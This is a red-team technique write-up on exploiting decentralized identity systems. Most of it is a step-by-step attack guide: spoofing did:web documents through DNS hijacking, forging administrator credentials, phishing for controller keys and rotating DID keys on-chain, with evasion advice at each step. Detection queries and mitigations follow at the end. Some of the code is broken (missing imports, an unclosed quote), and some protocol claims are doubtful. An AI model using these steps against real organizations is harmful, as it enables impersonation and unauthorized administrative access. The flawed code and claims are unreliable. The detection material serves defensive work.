# [EMERGING-IDENTITY-002]: Decentralized Identity (DID) Exploitation

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | EMERGING-IDENTITY-002 |
| **MITRE ATT&CK v18.1** | [T1556 - Modify Authentication Process](https://attack.mitre.org/techniques/T1556/) |
| **Tactic** | Initial Access, Privilege Escalation |
| **Platforms** | Entra ID, M365, Web3 Identity Systems |
| **Severity** | High |
| **CVE** | N/A (Emerging vulnerability class) |
| **Technique Status** | PARTIAL (Limited adoption, emerging attack surface) |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Entra ID DID Preview (beta), W3C DID implementations |
| **Patched In** | N/A (Standards-based, no patch model) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Decentralized Identity (DID) exploitation targets the emerging self-sovereign identity infrastructure built on blockchain and distributed ledger technologies. Unlike traditional centralized identity providers, DIDs operate without a single point of failure but introduce new attack surfaces through credential verification, resolver trust models, and proof validation mechanisms. Attackers exploit weak verification mechanisms in DID resolvers, forge verifiable credentials, or compromise DID controller keys to establish unauthorized access to organizations adopting DID-based authentication.

**Attack Surface:** DID resolution endpoints, verifiable credential issuers, DID controller keys (private keys), credential revocation registries, blockchain validators, self-issued OpenID Provider (SIOP) flows.

**Business Impact:** **Unauthorized identity assumption, credential forgery, and unauthorized access to DID-protected resources.** Attackers can forge credentials, bypass verification steps, or impersonate legitimate entities in DID ecosystems. This is particularly critical as organizations migrate to DID-based SSO and M2M authentication.

**Technical Context:** DID exploitation requires understanding of distributed ledger technology, cryptographic proofs, and the specific DID method used (did:ion, did:key, did:web, etc.). Attack execution timeframe is 10-30 minutes depending on resolver infrastructure. Detection probability is **Medium** due to sparse logging in blockchain systems and distributed nature of verification.

### Operational Risk
- **Execution Risk:** Medium (Requires cryptographic knowledge and understanding of target's DID infrastructure)
- **Stealth:** High (Distributed verification makes centralized logging difficult; forged credentials may appear legitimate)
- **Reversibility:** Low (Blockchain transactions are immutable; credential revocation requires separate mechanism)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS v8 Control 6.8 | Identify and Remediate Vulnerabilities in Authentication Systems |
| **DISA STIG** | IA-2, IA-7, SC-7 | Authentication, Information System Monitoring, Boundary Protection |
| **CISA SCuBA** | ID.AM-2, ID.P-2 | Supply Chain Risk Management, Policy Definition |
| **NIST 800-53** | IA-2, IA-5, IA-7, SC-12 | Authentication, Cryptographic Mechanisms |
| **GDPR** | Art. 25, Art. 32, Art. 33 | Data Protection by Design, Security, Breach Notification |
| **DORA** | Art. 15, Art. 16 | ICT Risk Management, ICT Incident Reporting |
| **NIS2** | Art. 21, Art. 24 | Risk Management, Incident Response |
| **ISO 27001** | A.13.1.1, A.13.1.3 | Cryptographic Controls, Key Management |
| **ISO 27005** | Threat: Cryptographic Key Compromise | Loss of identity assurance through key compromise |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Network access to DID resolver, ability to register/modify DID documents (if attacking resolver), or private key to DID controller (if attacking at credential level)
- **Required Access:** Network access to blockchain network (Ethereum, Polkadot, ION, etc.) and DID resolver endpoints

**Supported Versions:**
- **DID Specification:** W3C DID Core 1.0 (all compliant implementations)
- **Blockchain Networks:** Ethereum, Polkadot, ION (did:ion), Hyperledger Indy
- **Entra ID DID Support:** Microsoft Entra Verified ID (Preview/Beta)
- **Cryptographic Libraries:** libsodium, tweetnacl, ethers.js

**Tools:**
- [did-resolver](https://github.com/decentralized-identity/did-resolver) (JavaScript)
- [did-key-resolver](https://github.com/uport-project/did-key-resolver)
- [Hyperledger Indy](https://www.hyperledger.org/projects/hyperledger-indy)
- [Web3.js](https://github.com/web3/web3.js) (Ethereum interaction)
- [Polkadot.js](https://github.com/polkadot-js/api) (Polkadot interaction)

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: DID Resolver Manipulation (did:web Exploitation)

**Supported Versions:** All W3C-compliant DID implementations

#### Step 1: Identify Target's DID and Resolver
**Objective:** Discover the target organization's DID and determine which resolver they use.

**Command:**
```bash
# Resolve a target DID (e.g., for an organization)
curl -X GET "https://resolver.example.com/resolve?did=did:web:example.com" \
  -H "Accept: application/ld+json"

# Alternative: Use DID resolver library
npm install did-resolver did-web-resolver
node -e "
const { Resolver } = require('did-resolver');
const { getResolver } = require('did-web-resolver');
const resolver = new Resolver(getResolver());
resolver.resolve('did:web:example.com').then(doc => console.log(JSON.stringify(doc, null, 2)));
"
```

**Expected Output:**
```json
{
  "@context": "https://w3id.org/did/v1",
  "id": "did:web:example.com",
  "publicKey": [
    {
      "id": "did:web:example.com#key-1",
      "type": "RsaVerificationKey2018",
      "controller": "did:web:example.com",
      "publicKeyPem": "-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3..."
    }
  ],
  "authentication": ["did:web:example.com#key-1"],
  "assertionMethod": ["did:web:example.com#key-1"]
}
```

**What This Means:**
- Target's DID is `did:web:example.com`
- Resolver endpoint is `https://resolver.example.com`
- Public key is exposed for verification purposes
- The DID document defines which keys are authorized for authentication

**OpSec & Evasion:**
- DID resolution queries are not typically logged
- Resolution happens at HTTP level; blend with normal traffic
- Detection likelihood: Low

---

#### Step 2: Discover DID Document Location
**Objective:** Find where the DID document is hosted (for did:web, this is typically `.well-known/did.json`).

**Command:**
```bash
# For did:web, try standard location
curl -X GET "https://example.com/.well-known/did.json" \
  -H "Accept: application/json"

# If not there, check DID specification
curl -X GET "https://example.com/.well-known/did-configuration.json"

# Enumerate common paths
for path in "did.json" "did-document.json" ".well-known/did.json" "identity/did.json"; do
  echo "Checking: $path"
  curl -s -o /dev/null -w "%{http_code}" "https://example.com/$path"
done
```

**Expected Output:**
```
200
```

**What This Means:**
- DID document is publicly hosted at `https://example.com/.well-known/did.json`
- Attacker can read and potentially modify if website is compromised
- For did:web attacks, this is the critical exploitation point

**OpSec & Evasion:**
- HTTP requests appear as normal web browsing
- Detection likelihood: Very Low

---

#### Step 3: Compromise or Spoof DID Document
**Objective:** Either compromise the web server hosting the DID document, or spoof responses via DNS/MITM.

**Command (DNS Spoofing Attack):**
```bash
# Attacker controls DNS for example.com (or performs DNS hijacking)
# Point example.com to attacker-controlled server
# Create malicious DID document with attacker's public key

cat > /var/www/.well-known/did.json << 'EOF'
{
  "@context": "https://w3id.org/did/v1",
  "id": "did:web:example.com",
  "publicKey": [
    {
      "id": "did:web:example.com#key-1",
      "type": "RsaVerificationKey2018",
      "controller": "did:web:example.com",
      "publicKeyPem": "-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5+DY/...\nATTACKER-PUBLIC-KEY\n-----END PUBLIC KEY-----"
    }
  ],
  "authentication": ["did:web:example.com#key-1"],
  "assertionMethod": ["did:web:example.com#key-1"]
}
EOF

# Restart web server
systemctl restart nginx
```

**Expected Output:**
```
(Web server now serving malicious DID document)
```

**What This Means:**
- Future verifications of did:web:example.com will use attacker's public key
- Attacker can now issue credentials impersonating example.com
- Any verifier relying on resolver will accept forged credentials

**OpSec & Evasion:**
- DNS hijacking leaves traces in DNS logs
- Web server modification may be detected by file integrity monitoring
- Detection likelihood: Medium-High

---

#### Step 4: Forge Verifiable Credentials
**Objective:** Create fraudulent credentials signed with attacker's private key but claiming to be from the target organization.

**Command (JavaScript):**
```javascript
// npm install vc-js did-resolver did-web-resolver

const vc = require('vc-js');
const { Resolver } = require('did-resolver');
const { getResolver } = require('did-web-resolver');

const suite = new RsaSignature2018({
  key: new RsaVerificationKey2018({
    privateKeyPem: `-----BEGIN RSA PRIVATE KEY-----
...ATTACKER-PRIVATE-KEY...
-----END RSA PRIVATE KEY-----`,
    controller: 'did:web:example.com#key-1'
  })
});

const credential = {
  '@context': 'https://www.w3.org/2018/credentials/v1',
  'type': ['VerifiableCredential', 'EmployeeCredential'],
  'issuer': 'did:web:example.com',  // Forged issuer
  'issuanceDate': new Date().toISOString(),
  'credentialSubject': {
    'id': 'did:key:attacker-did',
    'name': 'John Admin',
    'role': 'Global Administrator'
  }
};

vc.issue({
  credential: credential,
  suite: suite,
  documentLoader: customDocumentLoader
}).then(verifiableCredential => {
  console.log(JSON.stringify(verifiableCredential, null, 2));
  // Send this to target application
});
```

**Expected Output:**
```json
{
  "@context": "https://www.w3.org/2018/credentials/v1",
  "type": ["VerifiableCredential", "EmployeeCredential"],
  "issuer": "did:web:example.com",
  "issuanceDate": "2026-01-10T00:00:00Z",
  "credentialSubject": {...},
  "proof": {
    "type": "RsaSignature2018",
    "created": "2026-01-10T00:00:00Z",
    "verificationMethod": "did:web:example.com#key-1",
    "signatureValue": "ML0kh...signature..."
  }
}
```

**What This Means:**
- Fraudulent credential is cryptographically signed
- Appears legitimate when verified against (malicious) DID document
- Any application trusting the resolver will accept it

**OpSec & Evasion:**
- Credential forgery happens offline
- No direct logging in victim's systems
- Detection likelihood: Low (if DID compromise not detected)

---

#### Step 5: Use Forged Credential for Authentication/Authorization
**Objective:** Present forged credential to target application for unauthorized access.

**Command (SIOP - Self-Issued OpenID Provider):**
```bash
# Attacker acts as SIOP, presenting forged credential
curl -X POST "https://target-app.com/auth/verify" \
  -H "Content-Type: application/json" \
  -d '{
    "verifiable_presentation": {
      "@context": "https://www.w3.org/2018/credentials/v1",
      "type": "VerifiablePresentation",
      "holder": "did:key:attacker-did",
      "verifiableCredential": [
        {
          "@context": "https://www.w3.org/2018/credentials/v1",
          "type": ["VerifiableCredential", "EmployeeCredential"],
          "issuer": "did:web:example.com",
          "credentialSubject": {
            "name": "John Admin",
            "role": "Global Administrator"
          },
          "proof": {...}
        }
      ],
      "proof": {...}
    }
  }'
```

**Expected Output:**
```json
{
  "access_token": "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer",
  "expires_in": 3600
}
```

**What This Means:**
- Application verified credential against compromised resolver
- Attacker granted access as impersonated Global Administrator
- Full system compromise possible

**OpSec & Evasion:**
- Application logs may show credential verification success
- If verifier logs the resolver endpoint, attacker's endpoint is revealed
- Detection likelihood: Medium (If verifier implements resolver endpoint validation)

---

### METHOD 2: Blockchain DID Key Compromise (did:ion or did:key)

**Supported Versions:** Ethereum-based DIDs (did:ion), Polkadot (did:polkadot)

#### Step 1: Identify Target's DID on Blockchain
**Objective:** Find target's DID registered on blockchain.

**Command:**
```bash
# Query ION network (Ethereum-based)
curl -X GET "https://ion.msidentity.com/identifiers/did:ion:EiBJZPOG-gNPI..." \
  -H "Accept: application/ld+json"

# Or query Polkadot
node -e "
const { ApiPromise, WsProvider } = require('@polkadot/api');
const main = async () => {
  const provider = new WsProvider('wss://rpc.polkadot.io');
  const api = await ApiPromise.create({ provider });
  const identity = await api.query.identity.identityOf('1AQKZ...');
  console.log(identity.toHuman());
};
main();
"
```

**Expected Output:**
```
did:ion:EiBJZPOG-gNPIcLxOXkljIOhKqMqHTvD9YdvqY5xvCHfEA
```

**What This Means:**
- Target has DID on blockchain
- DIDs are immutable once registered
- Attacker can read the DID document publicly

---

#### Step 2: Attempt Private Key Compromise (Social Engineering/Phishing)
**Objective:** Obtain the DID controller's private key.

**Command:**
```bash
# Phishing email for private key or seed phrase
# "Please verify your DID controller key to activate new services"
# Attacker sends fake verification link

# Once private key obtained, attacker can generate new DID operations
openssl genrsa -out attacker_key.pem 4096

# Sign a new key operation with stolen private key
node -e "
const crypto = require('crypto');
const privateKey = fs.readFileSync('stolen_did_key.pem', 'utf8');
const message = JSON.stringify({
  didSuffix: 'abc123',
  updateCommitment: 'new-commitment',
  operationIndex: 1
});
const signature = crypto.sign('sha256', Buffer.from(message), privateKey);
console.log(signature.toString('base64'));
"
```

**Expected Output:**
```
(Attacker now controls DID)
```

**What This Means:**
- Attacker can create new DIDs or modify existing ones
- Can revoke legitimate keys and add their own
- Full identity takeover

**OpSec & Evasion:**
- Phishing is detectable through email analysis
- Detection likelihood: Medium-High

---

#### Step 3: Blockchain Transaction for DID Key Rotation
**Objective:** Submit transaction to blockchain to replace target's keys with attacker's keys.

**Command (Ethereum/ION):**
```bash
# Create and submit DID update operation
cat > update_did.json << 'EOF'
{
  "type": "update",
  "didSuffix": "JZPOzlz2gNPI",
  "updateCommitment": "EiBJZPOG-newkey",
  "patches": [
    {
      "op": "replace",
      "path": "/publicKeys/0",
      "value": {
        "id": "#newkey",
        "controller": "did:ion:EiBJZPOG-gNPI",
        "type": "EcdsaSecp256k1VerificationKey2019",
        "publicKeyJwk": {
          "kty": "EC",
          "crv": "secp256k1",
          "x": "WKn-ZIGevcwGIyyrzFoZNBdaq9_TsqzGl96oc0CWuis",
          "y": "y77t-RvAHRKTsSGdIYUfweuOvwrvDD-Q3Hv5J0fSKTE"
        }
      }
    }
  ]
}
EOF

# Submit to blockchain (requires gas fees)
node -e "
const Web3 = require('web3');
const web3 = new Web3('https://mainnet.infura.io/v3/...');
// Sign and submit transaction
web3.eth.sendSignedTransaction(signedTx, (err, hash) => {
  console.log('Transaction hash:', hash);
});
"
```

**Expected Output:**
```
Transaction hash: 0x1234567890abcdef...
```

**What This Means:**
- Update is permanently recorded on blockchain
- Cannot be reversed without another transaction
- Attacker now controls the DID

**OpSec & Evasion:**
- Blockchain transactions are transparent
- All network participants see the transaction
- Detection likelihood: High (If monitoring blockchain for DID updates)

---

## 5. MICROSOFT SENTINEL DETECTION

### Query 1: Unusual DID Verification Patterns in Entra ID
**Rule Configuration:**
- **Required Table:** SigninLogs, AuditLogs
- **Required Fields:** AuthenticationProcessingDetails, AuthenticationMethodsUsed
- **Alert Severity:** High
- **Frequency:** Every 5 minutes

**KQL Query:**
```kusto
// Detect unusual DID credential verification
SigninLogs
| where AuthenticationMethodsUsed contains "did" or AuthenticationMethodsUsed contains "VerifiableCredential"
| where TimeGenerated > ago(1h)
| extend CredentialIssuer = tostring(parse_json(AuthenticationProcessingDetails[0]).issuer)
| extend CredentialIssuer = extract("did:.*", 0, CredentialIssuer)
| where CredentialIssuer != ""
| summarize Count = count() by UserPrincipalName, CredentialIssuer, IPAddress
| where Count > 5
| project UserPrincipalName, CredentialIssuer, IPAddress, Count
```

**What This Detects:**
- Multiple failed verifications of the same DID
- Unusual credential issuers
- Sign-in patterns from unexpected locations

---

### Query 2: DID Document Modification in Entra ID
**Rule Configuration:**
- **Required Table:** AuditLogs
- **Alert Severity:** Critical

**KQL Query:**
```kusto
// Detect DID document modifications
AuditLogs
| where OperationName in (
    "Update DID document",
    "Register DID",
    "Update DID keys",
    "Rotate DID key"
)
| where Result == "Success"
| extend ModifiedBy = tostring(InitiatedBy.user.userPrincipalName)
| extend DIDUpdated = tostring(TargetResources[0].displayName)
| project TimeGenerated, OperationName, ModifiedBy, DIDUpdated, ResultDescription
```

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Disable DID-based Authentication (If Not Required):** If organization is not using DIDs, disable support entirely.
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Entra ID** → **Authentication methods**
    2. Find **Decentralized Identity (Preview)**
    3. Click **Disabled**
    4. Click **Save**

*   **Implement DID Resolver Validation:** Restrict which resolvers are trusted for verification.
    **Manual Steps:**
    1. Create allowlist of approved DID resolvers
    2. Configure application to reject resolutions from non-listed resolvers
    3. Implement HTTPS pinning for resolver endpoints

### Priority 2: HIGH

*   **Cryptographic Key Protection:** Store DID controller keys in hardware security modules (HSMs).
    **Tools:**
    - Azure Key Vault (with FIPS 140-2 Level 3 HSM backing)
    - YubiKey 5 FIPS
    - Hardware security modules

*   **DID Document Monitoring:** Monitor blockchain for unauthorized DID updates.
    **Tool:** Custom script to monitor blockchain transactions
    ```bash
    # Monitor ION for updates
    watch -n 60 'curl -s "https://ion.msidentity.com/identifiers/did:ion:..." | jq .

    # Alert if update commitment changes
    ```

#### Validation Command (Verify Mitigations)
```bash
# Check if DID verification is using approved resolvers
curl -v https://approved-resolver.example.com/resolve?did=did:web:example.com | grep -i "issuer"

# Verify no unauthorized DID keys in blockchain
curl https://blockchain-explorer.com/api/did/example.com | jq '.keys | length'
```

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Resolver Endpoints:** Unusual DID resolver endpoints, resolver endpoints from non-reputable sources
*   **Blockchain Transactions:** DID key rotation transactions not initiated by legitimate administrators
*   **Credential Issuers:** Credentials with issuer DIDs that don't match organization's registered DIDs
*   **Verification Failures:** Sudden spike in credential verification failures followed by successes

### Response Procedures

1.  **Immediate Isolation:**
    - Disable compromised DID
    - Revoke all credentials issued by compromised DID
    - Alert all systems relying on the DID

2.  **Remediate:**
    - Generate new DID controller key
    - Update DID document on blockchain
    - Notify all credential verifiers of compromise

---

## 8. REAL-WORLD EXAMPLES

#### Example 1: W3C DID Specification Vulnerabilities (Research)
- **Timeline:** 2024-2025
- **Impact:** Theoretical vulnerabilities in DID resolution and verification
- **Reference:** W3C DID Core Working Group

#### Example 2: Entra Verified ID Preview Limitations
- **Timeline:** 2025-present
- **Impact:** Limited adoption prevents widespread attacks
- **Status:** PARTIAL viability

---

## SUMMARY

DID exploitation represents an emerging threat as organizations adopt decentralized identity. Current risk is **MEDIUM** due to limited real-world adoption, but will increase as DIDs become standard.

**Key Prevention:**
- Validate resolver endpoints
- Protect DID controller keys in HSMs
- Monitor blockchain for unauthorized updates
- Implement credential revocation checks

---